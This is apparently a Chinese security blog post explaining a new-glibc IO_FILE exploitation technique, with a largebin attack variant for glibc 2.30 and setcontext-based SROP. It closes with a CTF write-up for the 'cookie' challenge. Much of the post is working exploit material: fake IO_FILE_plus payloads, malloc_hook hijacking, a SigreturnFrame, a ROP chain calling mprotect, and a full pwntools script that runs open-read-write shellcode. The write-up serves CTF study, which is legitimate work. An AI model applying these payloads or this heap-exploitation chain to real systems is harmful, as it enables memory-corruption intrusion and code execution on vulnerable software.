> 原文链接: https://www.anquanke.com//post/id/216290 


# 新版本glibc下的IO_FILE攻击


                                阅读量   
                                **289065**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01058e6c04f3fe5960.png)](https://p0.ssl.qhimg.com/t01058e6c04f3fe5960.png)



## 前言

原本想在5月底写这篇文章的，但是由于一些特殊的原因一直拖到现在，该篇文章主要讲了新版本下的io_file攻击，该种攻击手法可以实现非预期堆块的申请、释放和填充以及实现glibc2.29往上版本的srop攻击(搭配largebin attrack效果更佳)



## 攻击原理：

在以前版本的IO_FILE攻击普遍上采用的是劫持IO函数的_chain字段为伪造的IO_FILE_plus然后进行利用，其中伪造的IO_FILE_plus的vtable一般是io_str_overflow这种函数，而新版本的IO_FILE攻击也不例外，首先我们看一下libc2.32上的io_str_overflow函数

```
int
_IO_str_overflow (FILE *fp, int c)
`{`
  int flush_only = c == EOF;
  size_t pos;
  if (fp-&gt;_flags &amp; _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
    `{`
      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
    `}`
  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))
    `{`
      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
    return EOF;
      else
    `{`
      char *new_buf;
      char *old_buf = fp-&gt;_IO_buf_base;
      size_t old_blen = _IO_blen (fp);
      size_t new_size = 2 * old_blen + 100;
      if (new_size &lt; old_blen)
        return EOF;
      new_buf = malloc (new_size);
      if (new_buf == NULL)
        `{`
          /*      __ferror(fp) = 1; */
          return EOF;
        `}`
      if (old_buf)
        `{`
          memcpy (new_buf, old_buf, old_blen);
          free (old_buf);
          /* Make sure _IO_setb won't try to delete _IO_buf_base. */
          fp-&gt;_IO_buf_base = NULL;
        `}`
      memset (new_buf + old_blen, '\0', new_size - old_blen);

      _IO_setb (fp, new_buf, new_buf + new_size, 1);
      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);
      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);
      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);
      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);

      fp-&gt;_IO_write_base = new_buf;
      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;
    `}`
    `}`

  if (!flush_only)
    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;
  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)
    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;
  return c;
`}`
```

可以看到程序里面有malloc,memcpy,free等函数，并且参数我们都可以控制因此可以利用这一点来进行非预期的堆块申请释放和填充,而且我们看一下IO_str_overflow的汇编代码可以看到一个有意思的位置：

```
0x7ffff7e6eb20 &lt;__GI__IO_str_overflow&gt;:    repz nop edx
   0x7ffff7e6eb24 &lt;__GI__IO_str_overflow+4&gt;:    push   r15
   0x7ffff7e6eb26 &lt;__GI__IO_str_overflow+6&gt;:    push   r14
   0x7ffff7e6eb28 &lt;__GI__IO_str_overflow+8&gt;:    push   r13
   0x7ffff7e6eb2a &lt;__GI__IO_str_overflow+10&gt;:    push   r12
   0x7ffff7e6eb2c &lt;__GI__IO_str_overflow+12&gt;:    push   rbp
   0x7ffff7e6eb2d &lt;__GI__IO_str_overflow+13&gt;:    mov    ebp,esi
   0x7ffff7e6eb2f &lt;__GI__IO_str_overflow+15&gt;:    push   rbx
   0x7ffff7e6eb30 &lt;__GI__IO_str_overflow+16&gt;:    sub    rsp,0x28
   0x7ffff7e6eb34 &lt;__GI__IO_str_overflow+20&gt;:    mov    eax,DWORD PTR [rdi]
   0x7ffff7e6eb36 &lt;__GI__IO_str_overflow+22&gt;:    test   al,0x8
   0x7ffff7e6eb38 &lt;__GI__IO_str_overflow+24&gt;:    jne    0x7ffff7e6eca0 &lt;__GI__IO_str_overflow+384&gt;
   0x7ffff7e6eb3e &lt;__GI__IO_str_overflow+30&gt;:    mov    edx,eax
   0x7ffff7e6eb40 &lt;__GI__IO_str_overflow+32&gt;:    mov    rbx,rdi
   0x7ffff7e6eb43 &lt;__GI__IO_str_overflow+35&gt;:    and    edx,0xc00
   0x7ffff7e6eb49 &lt;__GI__IO_str_overflow+41&gt;:    cmp    edx,0x400
   0x7ffff7e6eb4f &lt;__GI__IO_str_overflow+47&gt;:    je     0x7ffff7e6ec80 &lt;__GI__IO_str_overflow+352&gt;
   0x7ffff7e6eb55 &lt;__GI__IO_str_overflow+53&gt;:    mov    rdx,QWORD PTR [rdi+0x28]  &lt;----
   0x7ffff7e6eb59 &lt;__GI__IO_str_overflow+57&gt;:    mov    r14,QWORD PTR [rbx+0x38]
   0x7ffff7e6eb5d &lt;__GI__IO_str_overflow+61&gt;:    mov    r12,QWORD PTR [rbx+0x40]
   0x7ffff7e6eb61 &lt;__GI__IO_str_overflow+65&gt;:    xor    ecx,ecx
   0x7ffff7e6eb63 &lt;__GI__IO_str_overflow+67&gt;:    mov    rsi,rdx
   0x7ffff7e6eb66 &lt;__GI__IO_str_overflow+70&gt;:    sub    r12,r14
   0x7ffff7e6eb69 &lt;__GI__IO_str_overflow+73&gt;:    cmp    ebp,0xffffffff
   0x7ffff7e6eb6c &lt;__GI__IO_str_overflow+76&gt;:    sete   cl
   0x7ffff7e6eb6f &lt;__GI__IO_str_overflow+79&gt;:    sub    rsi,QWORD PTR [rbx+0x20]
   0x7ffff7e6eb73 &lt;__GI__IO_str_overflow+83&gt;:    add    rcx,r12
   0x7ffff7e6eb76 &lt;__GI__IO_str_overflow+86&gt;:    cmp    rcx,rsi
   0x7ffff7e6eb79 &lt;__GI__IO_str_overflow+89&gt;:    ja     0x7ffff7e6ec4a &lt;__GI__IO_str_overflow+298&gt;
   0x7ffff7e6eb7f &lt;__GI__IO_str_overflow+95&gt;:    test   al,0x1
   0x7ffff7e6eb81 &lt;__GI__IO_str_overflow+97&gt;:    jne    0x7ffff7e6ecc0 &lt;__GI__IO_str_overflow+416&gt;
   0x7ffff7e6eb87 &lt;__GI__IO_str_overflow+103&gt;:    lea    r15,[r12+r12*1+0x64]

```

可以看到在调用malloc之前的**0x7ffff7e6eb55**位置**rdx**被赋值为**[rdi+0x28]**,而此时的rdi恰好指向我们伪造的IO_FILE_plus的头部，而在glibc2.29的版本上setcontext的利用从以前的rdi变为了rdx，因此我们可以通过这个位置来进行新版下的setcontext,进而实现**srop**,具体做法是利用非预期地址填充将malloc_hook填充为setcontext，这样在我们进入io_str_overflow时首先会将rdx赋值为我们可以控制的地址，然后在后面malloc的时候会触发setcontext，而此时rdx已经可控，因此就可以成功实现srop<br>
综上可知参数对应关系为：

```
_flags = 0
_IO_write_ptr = 用于srop的地址（此时同时满足了fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base）
new_buf = malloc(2 * (_IO_buf_end - _IO_buf_base ) + 100)
memcpy(new_buf，_IO_buf_base，_IO_buf_end - _IO_buf_base)
free(_IO_buf_base)
```

### <a class="reference-link" name="glibc2.30%E4%B8%8B%E7%9A%84largebin%20attrack"></a>glibc2.30下的largebin attrack

首先看一下源码

```
else
`{`
  victim_index = largebin_index (size);
  bck = bin_at (av, victim_index);
  fwd = bck-&gt;fd;

  /* maintain large bins in sorted order */
  if (fwd != bck)
    `{`
      /* Or with inuse bit to speed comparisons */
      size |= PREV_INUSE;
      /* if smaller than smallest, bypass loop below */
      assert (chunk_main_arena (bck-&gt;bk));
      if ((unsigned long) (size)
  &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))
        `{`
          fwd = bck;
          bck = bck-&gt;bk;

          victim-&gt;fd_nextsize = fwd-&gt;fd;
          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
        `}`
      else
        `{`
          assert (chunk_main_arena (fwd));
          while ((unsigned long) size &lt; chunksize_nomask (fwd))
            `{`
              fwd = fwd-&gt;fd_nextsize;
  assert (chunk_main_arena (fwd));
            `}`

          if ((unsigned long) size
  == (unsigned long) chunksize_nomask (fwd))
            /* Always insert in the second position.  */
            fwd = fwd-&gt;fd;
          else
            `{`
              victim-&gt;fd_nextsize = fwd;
              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
              if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))
                malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
              fwd-&gt;bk_nextsize = victim;
              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
            `}`
          bck = fwd-&gt;bk;
          if (bck-&gt;fd != fwd)
            malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
        `}`
    `}`
  else
    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;
`}`

mark_bin (av, victim_index);
victim-&gt;bk = bck;
victim-&gt;fd = fwd;
fwd-&gt;bk = victim;
bck-&gt;fd = victim;
```

可以看到在将unsortedbin放入largbin的时候，程序在unsortedbin size &gt; largbin size的时候加了一个检查

```
if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))
                malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
```

而这个位置正是我们平时常用的位置，但是同时可以看到在size小于的时候没有加这个检查，因此我们可以通过这一点来进行glibc2.30下的largebin attrack,具体做法是首先在largbin中添加一个堆块，同时释放一个比它小并且在同意index的堆块进unsortedbin,改变largbin的bk_nextsize为targetaddr-0x20,然后我们申请一个free之后可以放入unsortedbin的堆块,这是会将unsortedbin放入largbin,并执行下面的流程

```
fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
```

而largbin-&gt;_bk_nexsize已经被劫持成了targetaddr-0x20了，因此会像targetaddr-0x20-&gt;fd_nextsize写入largbin堆块的值，即向targetaddr写入堆地址，然后我们free我们申请的这个堆块的时候就会和剩下的unsortedbin堆块合并，重新放入unsortedbin中，达到复用的效果



## 攻击流程

此种方法一般结合largebin attrack,因为largebin attrack可以实现任意地址填充堆地址，因此我们可以利用largebin attrack将io函数的_chain字段劫持为堆地址，然后当程序退出的时候会刷新程序流此时会进入我们伪造的io_file中实现我们的攻击,下面我们用我出的一个例题来具体体会一下该方法的威力



## 练习

此题为HWS – cookie，由于一些特殊原因就暂不提供附件了，师傅们可以根据分析写一个类似的题目

### <a class="reference-link" name="%E5%88%86%E6%9E%90%EF%BC%9A"></a>分析：

该题为glibc2.31,程序有add del edit show功能，在del里面有着明显的uaf漏洞，并且开了沙盒，add的时候只能申请largebin范围的堆块并且不超过0x600

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%EF%BC%9A"></a>利用：

我们考虑使用largebin attrack劫持stderr-&gt;_chain字段为一个堆地址并且劫持global_max_fast为堆地址用来构造chunkoverlapping,通过chunkoverlapping在0xa0的bin中留下两个堆块，其中一个是malloc_hook,然后我们利用io_file的非预期堆块申请申请到malloc_hook同时用非预期填充将malloc_hook填充为setcontext,这样在进入下一个fake IO_FILE的时候就会触发srop进而orw出flag,由此我们需要构造三个fake IO_FILE_plus，前两个用来申请到malloc_hook并且将malloc_hook填充为setcontext,最后一个用来设置rdx的值同时触发srop,

### <a class="reference-link" name="%E8%B0%83%E8%AF%95"></a>调试

我们进行简单的调试直观的看一下，首先我们通过chunkoverlapping来在0xa0的堆块中放入两个堆块，此时的bin:

[![](https://p3.ssl.qhimg.com/t017a32afa21fdf6fb5.png)](https://p3.ssl.qhimg.com/t017a32afa21fdf6fb5.png)

然后我们看一下我们的fake IO_FILE_plus<br>**Fake IO_FILE_plus1(malloc(0x90))**

```
payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #rdx
payload += p64(heap_base+0x10+0x290)+p64(heap_base+22+0x10+0x290)+p64(0)*4 #size
payload += p64(heap_base+0x1a90)+p64(0)+p64(0)+"\x00"*8 #_chain
payload += p64(0)*4+"\x00"*48
payload += p64(0x1ed560+libc_base)
```

可以看到第二行的两个地址差22，而通过我们的size计算可以得出size = (0x90-100)/2 = 22

[![](https://p4.ssl.qhimg.com/t010103630cc92153e2.png)](https://p4.ssl.qhimg.com/t010103630cc92153e2.png)

执行完之后：

[![](https://p4.ssl.qhimg.com/t019a05f4eec2600874.png)](https://p4.ssl.qhimg.com/t019a05f4eec2600874.png)

**Fake IO_FILE_plus2(malloc(0x90) &amp;&amp; hijack malloc_hook = setcontext)**

```
payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #rdx
payload += p64(heap_base+0x30+0x290)+p64(heap_base+22+0x30+0x290)+p64(0)*4 #size
payload += p64(heap_base+0x1fa0)+p64(0)+p64(0)+"\x00"*8 #chain
payload += p64(0)*4+"\x00"*48
payload += p64(0x1ed560+libc_base)
```

[![](https://p3.ssl.qhimg.com/t019bbb73d2089b8dab.png)](https://p3.ssl.qhimg.com/t019bbb73d2089b8dab.png)

执行之后：

[![](https://p4.ssl.qhimg.com/t01359312968708ac80.png)](https://p4.ssl.qhimg.com/t01359312968708ac80.png)

可以看到已经成功将malloc_hook劫持为setcontext,接下来执行第三个IO_FILE_plus就会触发srop，orw出flag<br>**Fake IO_FILE_plus3:(srop)**

```
payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #write
payload += p64(heap_base+0x50+0x290)+p64(heap_base+22+0x50+0x290)+p64(0)*4
payload += p64(heap_base+0x1fa0)+p64(0)+p64(0)+"\x00"*8
payload += p64(0)*4+"\x00"*48
payload += p64(0x1ed560+libc_base)
```

[![](https://p0.ssl.qhimg.com/t0195570e6d822ae8e8.png)](https://p0.ssl.qhimg.com/t0195570e6d822ae8e8.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01114db3b46acbee25.png)

### <a class="reference-link" name="%E5%AE%8C%E6%95%B4exp:"></a>完整exp:

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: cnitlrt
import sys
import os
import re
from pwn import *
# context.log_level = 'debug'

binary = './cookie'
elf = ELF('./cookie')
libc = elf.libc
context.binary = binary

DEBUG = 1
if DEBUG:
  p = process(binary)
else:
  host = sys.argv[1]
  port =  sys.argv[2]
  p = remote(host,port)
o_g = [0x45216,0x4526a,0xf02a4,0xf1147]
magic = [0x3c4b10,0x3c67a8,0x846c0,0x45390]#malloc,free,realloc,system
l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
sla = lambda a,b  :p.sendlineafter(str(a),str(b))
sa  = lambda a,b  :p.sendafter(str(a),str(b))
lg  = lambda name,data : p.success(name + ": 0x%x" % data)
se  = lambda payload: p.send(payload)
rl  = lambda      : p.recv()
sl  = lambda payload: p.sendline(payload)
ru  = lambda a     :p.recvuntil(str(a))
def cmd(idx):
    sla("&gt;&gt;",str(idx))
def add(size,payload):
    cmd(1)
    sla("Size:\n",str(size))
    sa("Content:\n",payload)
def show(idx):
    cmd(3)
    sla("Index:\n",str(idx))
def free(idx):
    cmd(2)
    sla("Index:\n",str(idx))
def edit(idx,payload):
    cmd(4)
    sla("Index:\n",str(idx))
    sa("Content:\n",payload)
def ss():
    gdb.attach(p)
    pause()
def exp():
    add(0x458,"aaaa")
    add(0x500,"aaaa")
    add(0x468,"aaaa")
    add(0x500,"aaaa")#3
    add(0x500,"aaaa")#4
    add(0x500,"aaaa")#5
    add(0x500,"aaaa")#6
    add(0x500,"aaaa")#7
    add(0x500,"aaaa")#8
    #leak libc_base
    free(2)
    show(2)
    libc_base = l64()-libc.sym['__malloc_hook']-0x10-96
    lg("libc_base",libc_base)
    #put chunk2 into largebin
    add(0x600,"aaaa")#9
    #leak heap_base
    edit(2,"a"*0x19)
    show(2)
    ru("a"*0x18)
    heap_base = u64(p.recv(6).ljust(8,"\x00"))-0xc61
    lg("heap_base",heap_base) 
    #put chunk0 into unsortedbin
    free(0)
    #hijack stderr-&gt;_chain = chunk2
    edit(2,p64(0)*3+p64(0x1ec628+libc_base-0x20))#stderr-&gt;_chain
    add(0x448,"aaa")#10
    free(10)
    #hijack global_max_fast = chunk2
    edit(2,p64(0)*3+p64(0x1eeb80+libc_base-0x20))#global_max_fast
    add(0x448,"aaa")#11
    #chunk overlapping
    edit(3,"a"*0x40+p64(0)+p64(0x511))
    edit(4,"a"*0x30+p64(0)+p64(0x21)*10)
    free(3)
    edit(3,p64(heap_base+0x10c0))
    add(0x500,"aaa")
    add(0x500,"ddd")#13
    edit(4,"a"*0x90+p64(0)+p64(0x471))
    edit(13,"a"*0x4b0+p64(0)+p64(0xa1))
    #fastbin attrack
    free(4)
    edit(4,p64(libc.sym["__malloc_hook"]+libc_base-0x10)+p64(0))
    free(4)
    edit(4,p64(libc.sym["__malloc_hook"]+libc_base-0x10)+p64(0))
    """
    tcachebins
    0xa0 [  2]: 0x56074fb96590 —▸ 0x7f116d446b60 (__memalign_hook) —▸ 0x7f116d2f8570 (memalign_hook_ini) ◂— ...
    fastbins

    """
    payload = p64(0x580dd+libc_base)+p64(0x21) #setcontext
    edit(0,payload*50)
    #malloc(0x90)
    payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #write
    payload += p64(heap_base+0x10+0x290)+p64(heap_base+22+0x10+0x290)+p64(0)*4
    payload += p64(heap_base+0x1a90)+p64(0)+p64(0)+"\x00"*8
    payload += p64(0)*4+"\x00"*48
    payload += p64(0x1ed560+libc_base)
    edit(2,payload)
    #malloc(0x90) &amp;&amp; set malloc_hook = setcontext
    payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #write
    payload += p64(heap_base+0x30+0x290)+p64(heap_base+22+0x30+0x290)+p64(0)*4
    payload += p64(heap_base+0x1fa0)+p64(0)+p64(0)+"\x00"*8
    payload += p64(0)*4+"\x00"*48
    payload += p64(0x1ed560+libc_base)
    edit(5,payload)
    #trigger &amp;&amp; rdx = QWORD PTR [rdi+0x28] = heap_base+0x29d0
    payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #write
    payload += p64(heap_base+0x50+0x290)+p64(heap_base+22+0x50+0x290)+p64(0)*4
    payload += p64(heap_base+0x1fa0)+p64(0)+p64(0)+"\x00"*8
    payload += p64(0)*4+"\x00"*48
    payload += p64(0x1ed560+libc_base)
    edit(6,payload)
    # ss()
    free_hook = libc_base+libc.sym["__free_hook"]
    free_hook1 = free_hook&amp;0xfffffffffffff000
    syscall = libc_base+0x0000000000066229
    #fakeframe
    frame = SigreturnFrame()
    frame.rdi = 0
    frame.rsi = free_hook1
    frame.rdx = 0x2000
    frame.rsp = free_hook1
    frame.rip = syscall
    edit(8,str(frame))

    poprdi = 0x0000000000026b72+libc_base
    poprsi = libc_base+0x0000000000027529
    pop2rdx = libc_base+0x000000000011c1e1
    poprax = libc_base+0x000000000004a550

    #mprotect(free_hook1,0x2000,7) &amp;&amp; orw shellcode
    payload = [poprdi,free_hook1,poprsi,0x2000,pop2rdx,0x7,0]
    payload += [poprax,10,syscall,free_hook1+0x58]

    sc = shellcraft.open("flag",0)
    sc += shellcraft.read("rax",free_hook1+0x300,0x40)
    sc += shellcraft.write(1,free_hook1+0x300,0x40)
    cmd(5)

    p.send(flat(payload)+asm(sc))
    p.interactive()
if __name__ == "__main__":
    exp()
```



## 总结：

该方法我觉得作用很大，可以在功能不够用的时候或存在限制的时候实现非预期申请释放和填充堆块，用的熟练的话可以达到意想不到的效果
